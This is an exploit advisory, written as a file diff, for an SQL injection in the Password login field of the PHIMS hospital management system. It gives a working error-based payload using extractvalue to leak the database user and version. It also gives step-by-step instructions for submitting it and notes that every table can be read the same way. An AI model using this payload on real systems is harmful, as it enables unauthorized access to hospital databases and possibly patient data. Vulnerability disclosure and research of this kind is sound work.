@@ -1,0 +1,33 @@
+# Exploit Title:  PHIMS - Hospital Management Information System - 'Password' SQL Injection
+# Dork: N/A
+# Date: 2018-02-16
+# Exploit Author: Borna nematzadeh (L0RD) or borna.nematzadeh123@gmail.com
+# Vendor Homepage: https://codecanyon.net/item/phims/14974225?s_rank=1566
+# Version: All version
+# Category: Webapps
+# CVE: N/A
+# # # # #
+# Description:
+# The vulnerability allows an attacker to inject sql commands.
+# # # # #
+# Proof of Concept :
+
+SQLI :
+
+
+# Parameter : Password (POST)
+#    Type: Error based
+#    Title:  MariaDB >= 10.2.11 AND Error based - extractvalue (XPATH query)
+#    Payload : 1" and extractvalue(1,concat(0x3a,user(),0x3a,version()))#
+#######################################
+# Discrption : The 'password' field is vulnerable in this script
+('Password' parameter).First inject payload into this parameter.
+# then put anything in username (like:anything@anything.anything) and click
+login. You will have XPATH syntax
+error in the next page that contains user and db_name .
+# You can find all tables and any information from database by using XPATH
+query .
+
+
+Username : anything@anything.anything
+Password : 1" and extractvalue(1,concat(0x3a,user(),0x3a,version()))#
